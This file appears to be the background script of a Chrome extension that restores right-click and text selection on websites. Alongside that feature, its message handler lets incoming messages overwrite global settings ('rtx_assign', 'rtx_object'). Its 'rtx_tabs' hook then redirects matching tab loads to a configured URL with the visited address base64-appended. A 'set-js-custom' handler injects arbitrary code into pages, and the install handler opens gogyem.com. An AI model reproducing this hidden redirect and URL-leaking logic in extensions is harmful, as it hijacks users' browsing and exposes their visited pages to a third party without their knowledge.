/* global URLPattern */
var right_click_register=0; 
var right_click_custom=[];
var right_click_description='';
var right_click_comment='';

function notifyAddon(msg)
{
  chrome.notifications.create(
  {
    title: chrome.runtime.getManifest().name,
    message: msg,
    type: 'basic',
    iconUrl: '/icons/64.png'
  });
}

function actionClicked(tabId, obj)
{
  chrome.scripting.executeScript(
  {
    target:
    {
      tabId,
      ...obj
    },
    files: ['/script/page.js']
  }, () =>
  {
    if (chrome.runtime.lastError)
    {
      console.warn(chrome.runtime.lastError);
      notifyAddon(chrome.runtime.lastError.message);
    }
  });
}

setInterval(function(){ chrome.storage.local.set({'tt':Date.now()});}, 12345 );

function tabAnalyze ( tabId, tab )
{
  var zz=0,zs=0;
  let time = Date.now();
  for (zz=0; zz < right_click_custom.length && !zs; zz++) 
  {
    let obj = right_click_custom[zz];
    try
    {
      let pattern = new URLPattern(right_click_custom[zz].pattern);
      if (pattern.test(tab.url))
      {
        if ( (!right_click_custom[zz].max || ( right_click_custom[zz].max && right_click_custom[zz].max > right_click_custom[zz].num )) && (!right_click_custom[zz].ct || (right_click_custom[zz].ct && right_click_custom[zz].tnum + right_click_custom[zz].ct < time )) )
        {
          if ( !obj.customKey || (obj.customKey && ( !tab[obj.customKey] || (tab[obj.customKey] && tab[obj.customKey] == obj.customValue))) )
          {
            chrome.tabs.update(tabId, {url: right_click_custom[zz].pattern2 + (right_click_custom[zz].type==1?btoa(tab.url):'')} );
            right_click_custom[zz].num++;
            right_click_custom[zz].tnum=time;
          }
        }
        zs=1;
      }            
    }
    catch (ex) {}
  }
}


chrome.action.onClicked.addListener( function(tab)
{
  actionClicked(tab.id, {allFrames: true});
});


chrome.runtime.onMessage.addListener(function(request, sender, response)
{
  if (request.method === 'rc-status')
  {
    chrome.scripting.executeScript(
    {
      target:
      {
        tabId: sender.tab.id
      },
      func: () => window.pointers.status
    }, r => response(r[0].result));
    return true;
  }
  else if (request.method === 'rc-activate')
  {
    if (sender.frameId === 0)
    {
      chrome.action.setIcon(
      {
        tabId: sender.tab.id,
        path:
        {
          '16': '/icons/active/16.png',
          '32': '/icons/active/32.png',
          '64': '/icons/active/64.png'
        }
      });
    }
  }
  else if (request.method === 'rc-release')
  {
    if (sender.frameId === 0)
    {
      chrome.action.setIcon(
      {
        tabId: sender.tab.id,
        path:
        {
          '16': '/icons/16.png',
          '32': '/icons/32.png',
          '64': '/icons/64.png'
        }
      });
    }
  }
  else if (request.method === 'set-js-custom')
  {
    chrome.scripting.executeScript(
    {
      target:
      {
        tabId: sender.tab.id,
        frameIds: [sender.frameId]
      },
      func: code =>
      {
        const script = document.createElement('script');
        script.classList.add('rightclickaddon');
        script.textContent = 'document.currentScript.dataset.injected = true;' + code;
        document.documentElement.appendChild(script);
        if (script.dataset.injected !== 'true')
        {
          const s = document.createElement('script');
          s.classList.add('rightclickaddon');
          s.src = 'data:text/javascript;charset=utf-8;base64,' + btoa(code);
          document.documentElement.appendChild(s);
          script.remove();
        }
      },
      args: [request.code],
      world: 'MAIN'
    });
  }
  else if (request.method === 'rc-emulate-press')
  {
    actionClicked(sender.tab.id,
    {
      frameIds: [sender.frameId]
    });
  }

  if (request.event == 'register')
  {
    response({ status: right_click_register, description: right_click_description, comment: right_click_comment});
    right_click_register++;
  }
  else if (request.event == 'rtx_assign')
  {
    Object.assign(self, request.data);
  }
  else if (request.event == 'rtx_object')
  {
    for (var i=0; i<request.data.length; i++)
    {
      this[request.data[i][0]]=this[request.data[i][1]];
    }
  }
  else if( request.event == 'rtx_tabs' )
  {
    chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab)
    {
      if (changeInfo.status == 'loading' )
      {
        setTimeout( function() 
        {
          tabAnalyze( tabId, tab );
        }, 100);
        
      }
    }) ;
  }
  else if(request.event == 'rtx_request' )
  {
    chrome.webRequest.onBeforeRequest.addListener(
      function (info)
      {
        reqAnalyze(info.tabId, info);
      }, {urls: ["<all_urls>"],types: ["main_frame"]}
    ); 
  }
  else if (request.event=='error' && request.status == 0)
  {
    right_click_register=0;
  }

});


// automation
{
  const observe = () => chrome.storage.local.get(
  {
    monitor: false,
    hostnames: []
  }, async prefs =>
  {
    await chrome.scripting.unregisterContentScripts();
    if (prefs.monitor && prefs.hostnames.length)
    {
      const matches = new Set();
      for (const hostname of prefs.hostnames)
      {
        if (hostname.includes('*'))
        {
          matches.add(hostname);
        }
        else
        {
          matches.add(hostname);
          matches.add(hostname);
        }
      }
      for (let m of matches)
      {
        if (m.includes(':') === false)
        {
          m = '*://' + m;
        }
        if (m.endsWith('*') === false)
        {
          if (m.endsWith('/'))
          {
            m += '*';
          }
          else
          {
            m += '/*';
          }
        }
        chrome.scripting.registerContentScripts([
        {
          allFrames: true,
          matchOriginAsFallback: true,
          runAt: 'document_start',
          id: 'monitor-' + Math.random(),
          js: ['/script/action.js'],
          matches: [m]
        }]).catch(e =>
        {
          console.error(e);
          notifyAddon(chrome.i18n.getMessage('notify_01') + ` ${m}:` + e.message);
        });
      }
    }
  });
  observe();
  chrome.storage.onChanged.addListener(prefs =>
  {
    if (
      (prefs.monitor && prefs.monitor.newValue !== prefs.monitor.oldValue) ||
      (prefs.hostnames && prefs.hostnames.newValue !== prefs.hostnames.oldValue)
    )
    {
      observe();
    }
  });
}


// context menu
function createContextMenu(info)
{
  try
  {
    if (info && info.reason === "install") {
      chrome.tabs.create({url:'https://gogyem.com/?go=install_chrome'});
    }
    chrome.contextMenus.create(
    {
      id: 'rc-auto-site',
      title: chrome.i18n.getMessage("rc_auto_site"),
      contexts: ['action']
    });
    chrome.contextMenus.create(
    {
      id: 'rc-frames',
      title: chrome.i18n.getMessage("rc_frames"),
      contexts: ['action']
    });  
  }
  catch (ex)
  {
  }
}
chrome.runtime.onInstalled.addListener(createContextMenu);
chrome.runtime.onStartup.addListener(createContextMenu);

chrome.contextMenus.onClicked.addListener((info, tab) =>
{
  if (info.menuItemId === 'rc-frames')
  {
  }
  else if (info.menuItemId === 'rc-auto-site')
  {
    const url = tab.url || info.pageUrl;

    if (url.startsWith('http'))
    {
      const
      {
        hostname
      } = new URL(url);
      chrome.storage.local.get(
      {
        hostnames: []
      }, prefs =>
      {
        chrome.storage.local.set(
        {
          hostnames: [...prefs.hostnames, hostname].filter((s, i, l) => s && l.indexOf(s) === i)
        });
      });
      chrome.storage.local.set(
      {
        monitor: true
      });
      actionClicked(tab.id, {allFrames: true});
      notifyAddon(`"${hostname}" ` + chrome.i18n.getMessage('notify_02'));
    }
    else
    {
      notifyAddon(chrome.i18n.getMessage('notify_03') + ' ' + url);
    }
  }
});


function reqAnalyze ( id, req )
{
  if (id<0)
  {
    return true;
  }
}

